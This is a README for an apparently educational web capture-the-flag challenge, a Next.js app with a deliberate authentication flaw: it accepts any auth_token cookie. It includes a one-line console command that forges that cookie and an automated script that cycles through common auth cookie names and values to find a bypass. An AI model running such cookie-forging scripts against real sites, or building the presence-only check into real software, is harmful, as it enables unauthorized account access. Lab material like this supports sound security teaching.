# 🎯 Otaku Hunter CTF

## 🏴‍☠️ Challenge Description

Welcome to the Otaku Hunter CTF! This is a web security challenge where you need to find a way to bypass the authentication system.

### 🎯 Objective
Find a way to access the protected content without knowing the password.

### 💡 Hints
- The authentication system might have some vulnerabilities
- Inspect how the application handles authentication
- Browser's developer tools might be helpful

### 🚀 Getting Started
1. Clone this repository
```bash
git clone https://github.com/Moha-df/otakuhunterCTF.git
cd otakuhunterCTF
```

2. Install dependencies
```bash
npm install
```

3. Run the development server
```bash
npm run dev
```

4. Open [http://localhost:3000](http://localhost:3000) in your browser

### 🏆 Solutions

#### Basic Solution
<details>
<summary>Click to reveal the basic solution</summary>

The authentication can be bypassed by creating an auth cookie in the browser's console:
```javascript
document.cookie = "auth_token=any_value; path=/; secure; samesite=strict";
```

This vulnerability exists because the application only checks for the presence of the auth_token cookie, not its value.
</details>

#### Advanced Solution
<details>
<summary>Click to reveal the advanced solution (Automated Cookie Testing Script)</summary>

You can use this script to automatically test various authentication cookie bypasses:

```javascript
// WARNING: This script is for educational purposes only
// Use exclusively on your own systems for security testing

// List of common authentication cookie names
const commonAuthCookieNames = [
  "auth_token",
  "authToken",
  "token",
  "session",
  "sessionid",
  "sid",
  "user_session",
  "usersession",
  "authenticate",
  "authenticated",
  "login",
  "logged_in",
  "loggedin",
  "user_id",
  "userId",
  "uid",
  "remember",
  "remember_token",
  "access_token",
  "accessToken",
  "jwt",
  "id_token",
  "idToken",
  "credential",
  "auth",
  "authorization",
  "user",
  "account",
  "ssid",
  "pass",
  "csrf",
  "xsrf"
];

// Values to try for cookies
const valuesToTry = [
  "true",
  "1",
  "yes",
  "authenticated",
  "valid",
  Math.random().toString(36).substring(2),  // Random value
  btoa("admin"),  // "admin" encoded in base64
  btoa("user"),   // "user" encoded in base64
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"  // Fake JWT token format
];

// Function to create a cookie and record its name
function createAuthCookie(name, value) {
  console.log(`Trying cookie: ${name} = ${value}`);
  document.cookie = `${name}=${value}; path=/; secure; samesite=strict`;
  return name;
}

// Function to delete a cookie
function deleteCookie(name) {
  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
}

// Main function to test cookies
async function testAuthCookies() {
  console.log("Starting cookie bypass tests...");
  console.log("Current URL: " + window.location.href);
  
  // Initial state: are we on a login page?
  const initialPageIsLogin = window.location.pathname === "/" || 
                            window.location.href.includes("login");
  
  if (!initialPageIsLogin) {
    console.log("We're already on an authenticated page, test impossible");
    return;
  }
  
  const createdCookies = [];
  let successfulCookie = null;
  
  // First clean any existing cookies
  commonAuthCookieNames.forEach(name => deleteCookie(name));
  
  // Try each cookie name with different values
  for (const name of commonAuthCookieNames) {
    // If we already found a bypass, stop
    if (successfulCookie) break;
    
    for (const value of valuesToTry) {
      // Create the cookie
      createdCookies.push(createAuthCookie(name, value));
      
      // Wait a short moment
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Reload the page to see if the cookie worked
      const currentUrl = window.location.href;
      window.location.reload();
      
      // This part will execute after reload
      // If we're redirected to another page, we've succeeded
      if (window.location.href !== currentUrl && !window.location.href.includes("login")) {
        console.log(`SUCCESS! Cookie bypass found: ${name}=${value}`);
        successfulCookie = { name, value };
        break;
      }
      
      // Delete the cookie before trying the next one
      deleteCookie(name);
    }
  }
  
  // Clean up created cookies
  createdCookies.forEach(name => deleteCookie(name));
  
  if (successfulCookie) {
    console.log(`Test completed. Bypass found with: ${successfulCookie.name}=${successfulCookie.value}`);
    return successfulCookie;
  } else {
    console.log("Test completed. No bypass found.");
    return null;
  }
}

// Run the test
testAuthCookies().then(result => {
  if (result) {
    console.log("To reproduce the bypass, run:");
    console.log(`document.cookie = "${result.name}=${result.value}; path=/; secure; samesite=strict";`);
    console.log("Then reload the page.");
  }
});
```

Copy this script into your browser's console to automatically test various cookie-based authentication bypasses.
</details>

## 🛡️ Educational Purpose
This CTF is designed for educational purposes to demonstrate:
- The importance of proper cookie validation
- Why you shouldn't trust client-side data
- How to properly implement authentication systems

## 🎨 Features
- Next.js 14 application
- Animated background with floating particles
- Responsive design
- Red-themed UI inspired by One Piece

## 👨‍💻 Author
Made by Soki